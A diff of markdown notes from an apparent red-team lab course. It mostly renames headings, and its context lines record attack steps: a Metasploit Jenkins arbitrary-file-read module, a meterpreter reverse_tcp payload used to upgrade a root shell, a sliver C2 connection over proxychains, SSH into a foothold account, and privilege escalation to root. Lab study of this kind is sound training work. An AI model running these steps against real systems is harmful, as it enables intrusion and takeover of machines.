@@ -144,7 +144,7 @@ Authentication required
 </body></html>                                   
 ```
 
-# Vulnerable jenkins instance
+## Vulnerable jenkins instance
 #### Console 1
 ```
 msf auxiliary(gather/jenkins_cli_ampersand_arbitrary_file_read) > info
@@ -255,7 +255,7 @@ whoami
 root
 ```
 
-# Upgrade the shell
+## Upgrade the shell
 ```
 msf > use payload/linux/x64/meterpreter/reverse_tcp 
 msf payload(linux/x64/meterpreter/reverse_tcp) > info
@@ -323,7 +323,7 @@ setup and connect to the sliver server via proxychains
 
 ---
 
-# Lab 4.1a
+# Lab 4.2a
 [[Lab L4.1a - Disable Adversary Tooling]]
 ## Prep the key
 ```trem1
@@ -1462,7 +1462,8 @@ dont know where to go from here
 
 ---
 
-# 4.2A
+
+# Lab 4.2b
 ## Access foothold account on red-river
 ```
 ssh foothold@20.30.40.160 -i super_secret_key -p 2222
@@ -1765,3 +1766,5 @@ tcp   LISTEN    0      128             [::]:2222          [::]:*
 	- python3 /home/foothold/cf2.py
 		- After obtaining root, execute the reverse tcp shell again to elevate the meterpreter shell's permissions
 ?? what is the context of the login ??
+
+# 
